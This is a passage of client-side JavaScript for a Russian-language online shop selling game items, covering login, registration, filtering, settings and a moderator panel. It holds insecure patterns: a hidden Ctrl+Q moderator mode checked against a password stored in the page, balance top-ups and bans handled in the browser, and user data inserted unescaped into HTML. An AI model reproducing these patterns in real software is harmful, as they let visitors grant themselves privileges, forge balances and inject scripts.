            const html = `<div class="panel-header"><h2>${t('settings')}</h2><button class="close-panel" onclick="closeFullscreenPanel()">✖</button></div><div class="panel-content"><div class="stats-grid"><div class="stat-card"><div class="number">${currentUser.username}</div><div>Имя</div></div><div class="stat-card"><div class="number">${inventory.length}</div><div>Предметов</div></div></div><h3 style="color:#ffaa33; margin:20px 0 10px;">${t('language')}</h3><select id="langSelect" onchange="changeLanguage()" style="width:100%; padding:15px; background:#2a2a35; border-radius:16px; color:white; margin-bottom:20px;"><option value="ru" ${currentLanguage==='ru'?'selected':''}>🇷🇺 Русский</option><option value="en" ${currentLanguage==='en'?'selected':''}>🇬🇧 English</option><option value="uk" ${currentLanguage==='uk'?'selected':''}>🇺🇦 Українська</option></select><h3 style="color:#ffaa33; margin:20px 0 10px;">💱 ${t('currency')}</h3><select id="currencySelect" onchange="changeCurrency()" style="width:100%; padding:15px; background:#2a2a35; border-radius:16px; color:white; margin-bottom:20px;"><option value="rub" ${currentCurrency==='rub'?'selected':''}>${t('rub')}</option><option value="uah" ${currentCurrency==='uah'?'selected':''}>${t('uah')}</option><option value="usd" ${currentCurrency==='usd'?'selected':''}>${t('usd')}</option></select><button class="action-btn secondary" onclick="showCommissionModal()">${t('commission')}</button>${isModerator ? renderModeratorPanel() : ''}</div>`;
            document.getElementById('fullscreenPanel').innerHTML = html;
        }
        
        function renderModeratorPanel() {
            const usersList = auth.getAllUsers();
            return `<div style="margin-top: 30px; border-top: 1px solid #ffaa33; padding-top: 20px;"><h3 style="color:#ffaa33;">👑 Панель модератора</h3><div class="user-list">${usersList.map(u => `
                <div class="user-item">
                    <div><strong>${u.username}</strong><br><small>${u.email}</small><br><small>Баланс: ${(u.balance || 0).toFixed(2)} ${getCurrencySymbol()}</small><br><small>${u.isBanned ? '🔴 Заблокирован' : '🟢 Активен'}</small></div>
                    <div class="user-actions">
                        <button onclick="moderatorAddBalance('${u.id}')" style="background:#4caf50;">💰 Пополнить</button>
                        <button onclick="moderatorBanUser('${u.id}')" style="background:#ff4444;">🔨 Блок</button>
                        <button onclick="moderatorDeleteUser('${u.id}')" style="background:#ff6600;">🗑️ Удалить</button>
                    </div>
                </div>
            `).join('')}</div></div>`;
        }
        
        function moderatorAddBalance(userId) {
            const amount = prompt('Введите сумму пополнения (в рублях):');
            if(amount && !isNaN(amount)) {
                auth.addBalance(userId, parseFloat(amount));
                if (currentUser && currentUser.id === userId) {
                    balance = currentUser.balance;
                    updateBalanceDisplay();
                }
                showToast(`✅ Баланс пополнен на ${amount} ₽`, 'success');
                if(document.getElementById('fullscreenPanel').classList.contains('active')) renderCurrentPanel();
            }
        }
        
        function moderatorBanUser(userId) {
            auth.banUser(userId);
            if (currentUser && currentUser.id === userId) {
                currentUser = null;
                balance = 0;
                cart = [];
                inventory = [];
                updateUIBeforeAuth();
            }
            showToast(`🔨 Действие выполнено`, 'success');
            if(document.getElementById('fullscreenPanel').classList.contains('active')) renderCurrentPanel();
        }
        
        function moderatorDeleteUser(userId) {
            if(confirm('Удалить пользователя? Это действие необратимо!')) {
                auth.deleteUser(userId);
                if (currentUser && currentUser.id === userId) {
                    currentUser = null;
                    balance = 0;
                    cart = [];
                    inventory = [];
                    updateUIBeforeAuth();
                }
                showToast(`🗑️ Пользователь удален`, 'success');
                if(document.getElementById('fullscreenPanel').classList.contains('active')) renderCurrentPanel();
            }
        }
        
        function changeLanguage() {
            currentLanguage = document.getElementById('langSelect')?.value || 'ru';
            localStorage.setItem('vex_language', currentLanguage);
            updateUITexts();
            if(document.getElementById('fullscreenPanel').classList.contains('active')) renderCurrentPanel();
            renderMainGrid();
        }
        
        function changeCurrency() {
            currentCurrency = document.getElementById('currencySelect')?.value || 'rub';
            localStorage.setItem('vex_currency', currentCurrency);
            updateBalanceDisplay();
            renderMainGrid();
            if(document.getElementById('fullscreenPanel').classList.contains('active')) renderCurrentPanel();
            showToast('💱 Валюта изменена', 'success');
        }
        
        function updateUITexts() {
            renderMainGrid();
        }
        
        function showLoginError(message) {
            const errorDiv = document.getElementById('loginError');
            if (errorDiv) {
                errorDiv.textContent = message;
                errorDiv.classList.add('show');
            }
        }
        
        function clearLoginError() {
            const errorDiv = document.getElementById('loginError');
            if (errorDiv) {
                errorDiv.classList.remove('show');
                errorDiv.textContent = '';
            }
        }
        
        function openLoginPanel() {
            const html = `
                <div class="panel-header">
                    <h2>🔐 Добро пожаловать!</h2>
                    <button class="close-panel" onclick="closeFullscreenPanel()">✖</button>
                </div>
                <div class="panel-content">
                    <div class="login-container">
                        <h2>Добро пожаловать!</h2>
                        <div class="subtitle">Введите данные для входа</div>
                        
                        <input type="text" id="loginEmail" class="login-input" placeholder="E-mail">
                        <input type="password" id="loginPassword" class="login-input" placeholder="Пароль">
                        
                        <div id="loginError" class="login-error"></div>
                        
                        <div class="forgot-password">
                            <a href="#" onclick="showToast('❌ Функция восстановления временно недоступна', 'error'); return false;">Забыли пароль?</a>
                        </div>
                        
                        <button class="login-btn" onclick="handleLoginFromPanel()">Войти →</button>
                        
                        <div class="register-link">
                            Нет аккаунта? <a href="#" onclick="openRegisterPanel(); return false;">Создать аккаунт</a>
                        </div>
                    </div>
                </div>
            `;
            document.getElementById('fullscreenPanel').innerHTML = html;
            document.getElementById('fullscreenPanel').classList.add('active');
            document.body.style.overflow = 'hidden';
            clearLoginError();
        }
        
        function handleLoginFromPanel() {
            const email = document.getElementById('loginEmail')?.value;
            const password = document.getElementById('loginPassword')?.value;
            
            clearLoginError();
            
            if (!email || !password) {
                showLoginError('❌ Введите email и пароль');
                return;
            }
            
            const result = auth.login(email, password);
            
            if (!result.success) {
                showLoginError(result.message);
                return;
            }
            
            showToast(result.message, 'success');
            currentUser = result.user;
            balance = currentUser.balance || 0;
            inventory = currentUser.inventory || [];
            cart = auth.getCart();
            isModerator = currentUser.isModerator || false;
            updateUIBeforeAuth();
            closeFullscreenPanel();
        }
        
        function openRegisterPanel() {
            const html = `
                <div class="panel-header">
                    <h2>📝 Создать аккаунт</h2>
                    <button class="close-panel" onclick="closeFullscreenPanel()">✖</button>
                </div>
                <div class="panel-content">
                    <div class="login-container">
                        <h2>Создание аккаунта</h2>
                        <div class="subtitle">Заполните данные для регистрации</div>
                        
                        <input type="text" id="regName" class="login-input" placeholder="Имя пользователя">
                        <input type="email" id="regEmail" class="login-input" placeholder="E-mail">
                        <input type="password" id="regPass" class="login-input" placeholder="Пароль (мин. 6 символов)">
                        
                        <div id="regError" class="login-error"></div>
                        
                        <button class="login-btn" onclick="handleRegisterFromPanel()">Зарегистрироваться →</button>
                        
                        <div class="register-link">
                            Уже есть аккаунт? <a href="#" onclick="openLoginPanel(); return false;">Войти</a>
                        </div>
                    </div>
                </div>
            `;
            document.getElementById('fullscreenPanel').innerHTML = html;
            document.getElementById('fullscreenPanel').classList.add('active');
            document.body.style.overflow = 'hidden';
        }
        
        function handleRegisterFromPanel() {
            const username = document.getElementById('regName')?.value;
            const email = document.getElementById('regEmail')?.value;
            const password = document.getElementById('regPass')?.value;
            
            const errorDiv = document.getElementById('regError');
            if (errorDiv) {
                errorDiv.classList.remove('show');
                errorDiv.textContent = '';
            }
            
            const result = auth.register(email, password, username);
            
            if (!result.success) {
                if (errorDiv) {
                    errorDiv.textContent = result.message;
                    errorDiv.classList.add('show');
                }
                return;
            }
            
            showToast(result.message, 'success');
            currentUser = result.user;
            balance = currentUser.balance || 0;
            inventory = currentUser.inventory || [];
            cart = auth.getCart();
            isModerator = currentUser.isModerator || false;
            updateUIBeforeAuth();
            closeFullscreenPanel();
        }
        
        function logout() {
            const result = auth.logout();
            showToast(result.message, 'success');
            currentUser = null;
            balance = 0;
            cart = [];
            inventory = [];
            isModerator = false;
            updateUIBeforeAuth();
        }
        
        function switchGame(game) {
            currentGame = game;
            document.querySelectorAll('.game-tab').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            currentItems = game === 'mm2' ? [...mm2Items] : [...adoptItems];
            filteredItems = [...currentItems];
            applyFilters();
        }
        
        function applyFilters() {
            let filtered = [...currentItems];
            const type = document.getElementById('typeFilter')?.value;
            const sort = document.getElementById('sortFilter')?.value;
            const search = document.getElementById('searchInput')?.value.toLowerCase();
            const rate = getCurrencyRate();
            
            if (type && type !== 'all') filtered = filtered.filter(i => i.type === type);
            if (search) filtered = filtered.filter(i => i.name.toLowerCase().includes(search));
            
            if (sort === 'price-asc') {
                if (currentGame === 'mm2') filtered.sort((a, b) => (a.value * rate) - (b.value * rate));
                else filtered.sort((a, b) => a.price - b.price);
            } else if (sort === 'price-desc') {
                if (currentGame === 'mm2') filtered.sort((a, b) => (b.value * rate) - (a.value * rate));
                else filtered.sort((a, b) => b.price - a.price);
            } else {
                filtered.sort((a, b) => a.name.localeCompare(b.name));
            }
            
            filteredItems = filtered;
            renderMainGrid();
            if(document.getElementById('fullscreenPanel').classList.contains('active') && currentPanelType === 'market') renderMarketPanel();
        }
        
        function renderMainGrid() {
            const grid = document.getElementById('itemsGrid');
            if (!grid) return;
            const symbol = getCurrencySymbol();
            grid.innerHTML = filteredItems.map((item, index) => {
                const price = getItemPrice(item);
                const itemType = item.type || (currentGame === 'adopt' ? item.type : '');
                const errorId = `buyErrorMain_${Date.now()}_${index}`;
                return `<div class="item-card"><img src="${item.image}" onerror="this.src='https://via.placeholder.com/110'"><div class="item-name">${item.name}</div>${itemType ? `<div class="item-type">${itemType}</div>` : ''}<div class="item-price">${price} ${symbol}</div><div class="item-buttons"><button class="cart-btn-item" onclick="addToCart('${item.name}', ${price}, '${itemType}')">${t('addToCart')}</button><button class="buy-btn-item" onclick="buyItem('${item.name}', ${price}, '${itemType}', '${errorId}')">${t('buy')}</button></div><div id="${errorId}" class="buy-error"></div></div>`;
            }).join('');
            if (filteredItems.length === 0) grid.innerHTML = '<div class="empty-state" style="grid-column:1/-1">🔍 Ничего не найдено</div>';
        }
        
        function showNotification(message, isSuccess = true) {
            const notification = document.createElement('div');
            notification.className = 'moderator-notification';
            notification.style.background = isSuccess ? '#4caf50' : '#ff4444';
            notification.textContent = message;
            document.body.appendChild(notification);
            setTimeout(() => notification.remove(), 3000);
        }
        
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'q') {
                e.preventDefault();
                const password = prompt('🔐 Введите пароль для входа в режим модератора:');
                if (password === MODERATOR_PASSWORD) {
                    if (currentUser) {
                        currentUser.isModerator = true;
                        auth.updateUser(currentUser);
                        isModerator = true;
                    }
                    showNotification('✅ Вы вошли в режим разработчика!', true);
                    const badge = document.getElementById('moderatorBadge');
                    if (badge) badge.classList.remove('hidden');
                    if (document.getElementById('fullscreenPanel').classList.contains('active') && currentPanelType === 'settings') {
                        renderSettingsPanel();
                    }
                } else if (password !== null) {
                    showNotification('❌ Неверный пароль!', false);
                }
            }
        });
        
        window.onload = function() {
            console.log("Сайт загружен, проверяем сохраненные данные...");
            currentUser = auth.getUser();
            if (currentUser) {
                balance = currentUser.balance || 0;
                inventory = currentUser.inventory || [];
                cart = auth.getCart();
                isModerator = currentUser.isModerator || false;
                updateUIBeforeAuth();
                console.log("Пользователь найден: " + currentUser.username);
            } else {
                console.log("Пользователь не найден");
            }
            renderMainGrid();
        };
        
        updateUIBeforeAuth();
        renderMainGrid();
    </script>
</body>
</html>
